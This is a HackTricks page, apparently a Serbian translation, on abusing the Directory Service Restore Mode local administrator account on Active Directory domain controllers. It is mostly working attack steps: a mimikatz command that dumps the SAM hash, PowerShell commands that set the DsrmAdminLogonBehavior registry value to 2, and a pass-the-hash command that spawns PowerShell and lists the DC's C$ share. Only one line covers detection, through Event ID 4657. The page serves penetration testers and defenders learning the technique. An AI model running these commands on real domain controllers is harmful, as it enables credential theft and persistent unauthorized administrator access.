# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Unutar svakog **DC**-a postoji nalog **lokalnog administratora**. Ako imate administratorske privilegije na ovoj mašini, možete koristiti mimikatz za **dump** **hash-a lokalnog Administrator naloga**. Zatim, izmenom registra možete **aktivirati ovu lozinku**, kako biste mogli daljinski da pristupite ovom lokalnom Administrator korisniku.\
Prvo treba da **dump-ujemo** **hash** **lokalnog Administrator** korisnika unutar DC-a:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Zatim treba da proverimo da li će taj nalog raditi, a ako registarski ključ ima vrednost "0" ili ne postoji, potrebno je da ga **postavite na "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Zatim, koristeći PTH, možete **izlistati sadržaj direktorijuma C$ ili čak dobiti shell**. Imajte na umu da je za kreiranje nove powershell sesije sa tim hash-om u memoriji (za PTH) **"domain" koji se koristi samo naziv DC mašine**:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Više informacija o ovome: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) i [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Ublažavanje

- Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Reference

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
